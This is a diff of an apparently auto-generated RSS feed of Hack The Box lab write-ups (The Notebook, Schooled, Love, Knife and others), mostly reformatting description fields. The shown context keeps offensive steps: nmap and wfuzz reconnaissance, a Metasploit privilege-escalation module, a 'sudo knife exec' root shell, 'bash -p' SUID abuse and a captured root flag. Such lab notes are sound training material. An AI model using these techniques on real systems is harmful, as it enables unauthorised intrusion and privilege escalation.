@@ -14,11 +14,13 @@
       <pubDate>Tue, 07 Sep 2021 13:20:07 +0200</pubDate>
       
       <guid>/labs/the_notebook/</guid>
-      <description>Foothold 1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.
-2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.
-3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:
-Header: { &amp;#34;typ&amp;#34;: &amp;#34;JWT&amp;#34;, &amp;#34;alg&amp;#34;: &amp;#34;RS256&amp;#34;, &amp;#34;kid&amp;#34;: &amp;#34;http://localhost:7070/privKey.</description>
-      <content>&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;</description>
+      <content>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;foothold&#34;&gt;Foothold&lt;/h2&gt;
 &lt;p&gt;1- Nmap finds open ports 22 and 80, filtered port 10010/tcp filtered rxapi.&lt;/p&gt;
 &lt;p&gt;2- Web is a notekeeper CRUD website. On the login page, I found that I can enumerate usernames because it tells me the reason auth failed: there is a user called &amp;lsquo;admin&amp;rsquo;.&lt;/p&gt;
 &lt;p&gt;3- Register an account, and look at the cookies: auth and uuid. Auth cookie seems a JWT token. Decode and find:&lt;/p&gt;
@@ -228,11 +230,9 @@ file reveals it&amp;rsquo;s a tar gz file &amp;ndash;&amp;gt; &lt;code&gt;tar xv
       <pubDate>Tue, 07 Sep 2021 13:19:47 +0200</pubDate>
       
       <guid>/labs/schooled/</guid>
-      <description>Rank: medium  Foothold 1- nmap discovered 22, 80, 33060 (mysqlx)
-2- Web clues:
- contact.php -&amp;gt; 404 email: admissions@schooled.htb web address schooled.htb -&amp;gt; suggests there can be subdomains  3- Fuzzing vhost.
-wfuzz -c -u &amp;#34;http://schooled.htb/&amp;#34; -H &amp;#34;Host:FUZZ.schooled.htb&amp;#34; -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hl 461 # (Hide those whose line is 461).  Found moodle.schooled.htb.
-4- Self enroll in Maths. Read announcements. The teacher Manuel Philips will check himself when we set the MoodleNet profile.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: medium&lt;/li&gt;
+&lt;/ul&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: medium&lt;/li&gt;
 &lt;/ul&gt;
@@ -311,8 +311,7 @@ echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/usr/local/etc/my.conf&a
 
 pkg create -m &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/ -r &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/ -p &lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;STAGEDIR&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;/plist -o .
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;18- bash -p (this option exploits the SETUID bit if set).&lt;/p&gt;
-&lt;p&gt;root.txt: 85336d96f89869c69d073a90de2730b1&lt;/p&gt;
-</content>
+&lt;p&gt;root.txt: 85336d96f89869c69d073a90de2730b1&lt;/p&gt;</content>
     </item>
     
     <item>
@@ -498,8 +497,9 @@ other::---
       <pubDate>Tue, 07 Sep 2021 13:19:35 +0200</pubDate>
       
       <guid>/labs/love/</guid>
-      <description>Rank: easy  Foothold 1-Usual sudo nmap -sC -sV -oA nmap target to discover ports 80, 443, 135, 139, 445, 5000. I take note of the Apache version and box version Windows 10 Pro 19042. There is also a 3306 port for mysql MariaDB, which says that my IP is not allowed to connect to the DB (Agggh, IP restriction).
-2- I can deduce that the box offers services http, https, MS samba, mysql and an unknown service 5000.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: easy&lt;/li&gt;
 &lt;/ul&gt;
@@ -528,8 +528,7 @@ use exploit/windows/local/always_install_elevated
 set session &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; 
 set LHOST xxxxx
 exploit 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;13- GOT NT AUTHORITY/SYSTEM shell.&lt;/p&gt;
-</content>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;13- GOT NT AUTHORITY/SYSTEM shell.&lt;/p&gt;</content>
     </item>
     
     <item>
@@ -538,7 +537,9 @@ exploit
       <pubDate>Tue, 07 Sep 2021 13:19:29 +0200</pubDate>
       
       <guid>/labs/knife/</guid>
-      <description>Rank: easy  Foothold  Nmap to find ports 22 and 80. There seems to be no exploit from Apache and OpenSSH versions. Inspect the HTML and the web request. Use nikto to scan. Found PHP version 8 dev, for which there is an exploit in ExploitDB. Get user shell using the backdoor PHP exploit.  Privilege escalation sudo -l to find knife. knife can execute ruby script, so:  sudo knife exec -E &amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39; Note that we didn&amp;rsquo;t use SSH.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: easy&lt;/li&gt;
 &lt;/ul&gt;
@@ -553,8 +554,7 @@ exploit
 &lt;li&gt;&lt;code&gt;sudo -l&lt;/code&gt; to find knife. knife can execute ruby script, so:&lt;/li&gt;
 &lt;/ol&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sudo knife exec -E &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;exec &amp;#34;/bin/bash&amp;#34;&amp;#39;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that we didn&amp;rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.&lt;/p&gt;
-</content>
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that we didn&amp;rsquo;t use SSH. Another potential solution would be to bruteforce the SSH connection.&lt;/p&gt;</content>
     </item>
     
     <item>
@@ -798,8 +798,9 @@ OR psexec.py&lt;/p&gt;
       <pubDate>Tue, 07 Sep 2021 13:19:14 +0200</pubDate>
       
       <guid>/labs/explore/</guid>
-      <description>Rank: easy  Foothold 1- Nmap for all ports.
-# Nmap 7.91 scan initiated Tue Jul 20 07:48:06 2021 as: nmap -sC -sV -p- -oA nmap target Nmap scan report for target (10.10.10.247) Host is up (0.061s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38595/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: easy&lt;/li&gt;
 &lt;/ul&gt;
@@ -1154,8 +1155,9 @@ bash -p
       <pubDate>Tue, 07 Sep 2021 13:18:54 +0200</pubDate>
       
       <guid>/labs/armageddon/</guid>
-      <description>Rank: easy  Foothold 1- By nmapping we find ports 22 and 80. 80 uses Drupal 7. With a quick msfconsole search we find that Drupal 7 is exploitable, with an exploit name very similar to Armageddon (there is one which does not work).
-# Nmap 7.91 scan initiated Sat Jul 3 12:38:54 2021 as: nmap -sC -sV -v -oA nmap 10.10.10.233 Nmap scan report for 10.10.10.233 Host is up (0.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: easy&lt;/li&gt;
 &lt;/ul&gt;
@@ -1546,9 +1548,10 @@ There is a PHAR deserialization CVE that allows RCE: CVE-2021-3129. &lt;a href=&
       <pubDate>Tue, 07 Sep 2021 12:36:57 +0200</pubDate>
       
       <guid>/labs/bounty_hunter/</guid>
-      <description>Rank: easy  These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.
-Foothold 1- Nmap discovers ports 22 and 80.
-# Nmap 7.91 scan initiated Mon Aug 2 03:22:27 2021 as: nmap -sC -sV -v -p- -oA nmap bountyhunter.htb Nmap scan report for bountyhunter.htb (10.</description>
+      <description>&lt;ul&gt;
+&lt;li&gt;Rank: easy&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;These are the notes I took while attacking the machine. Note that it contains failed attempts that lead to dead ends but I edited them a bit to make the steps easier to follow.&lt;/p&gt;</description>
       <content>&lt;ul&gt;
 &lt;li&gt;Rank: easy&lt;/li&gt;
 &lt;/ul&gt;
